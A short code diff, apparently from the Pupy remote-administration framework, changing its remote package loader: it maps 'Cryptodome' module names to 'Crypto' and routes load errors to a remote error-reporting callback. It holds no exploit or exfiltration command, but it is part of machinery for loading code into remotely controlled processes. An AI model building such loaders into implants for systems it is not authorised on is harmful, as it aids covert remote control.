@@ -367,6 +367,9 @@ def get_module_files(fullname):
 
 def pupy_add_package(pkdic, compressed=False, name=None):
     """ update the modules dictionary to allow remote imports of new packages """
+
+    global remote_print_error
+
     import cPickle
     import zlib
 
@@ -537,6 +540,19 @@ class PupyPackageLoader(object):
         imp.acquire_lock()
         try:
             dprint('loading module {}'.format(fullname))
+
+            if fullname.startswith('Cryptodome'):
+                parts = fullname.split('.')
+                if parts[0] == 'Cryptodome':
+                    parts[0] = 'Crypto'
+
+                new_fullname = '.'.join(parts)
+
+                dprint('Rename: {} -> {}'.format(
+                    fullname, new_fullname))
+
+                fullname = new_fullname
+
             if fullname in sys.modules:
                 return sys.modules[fullname]
 
@@ -568,7 +584,11 @@ class PupyPackageLoader(object):
                     dprint('Load {} from marshalled file ({})'.format(fullname, self.extension))
                     loadpy(self.contents[8:], mod.__dict__, self.extension == 'pye')
                 except Exception, e:
-                    dprint('Load {} failed: Exception: {}'.format(fullname, e))
+                    message = 'Load {} failed: Exception: {}'.format(fullname, e)
+                    if remote_print_error:
+                        remote_print_error(message)
+                    else:
+                        dprint(message)
 
             elif self.extension in ('dll', 'pyd', 'so'):
                 if '.' in fullname:
@@ -600,10 +620,10 @@ class PupyPackageLoader(object):
 
             if remote_print_error:
                 try:
-                    dprint('Call remote_print_error() - error loading package - start'.format())
+                    dprint('Call remote_print_error() - error loading package {} - start'.format(fullname))
                     remote_print_error("Error loading package {} ({} pkg={}) : {}".format(
-                        fullname, self.path, self.is_pkg, str(traceback.format_exc())))
-                    dprint('Call remote_print_error() - error loading package - complete'.format())
+                        fullname, self.path, self.is_pkg, traceback.format_exc()))
+                    dprint('Call remote_print_error() - error loading package {} - complete'.format(fullname))
                 except:
                     pass
             else:
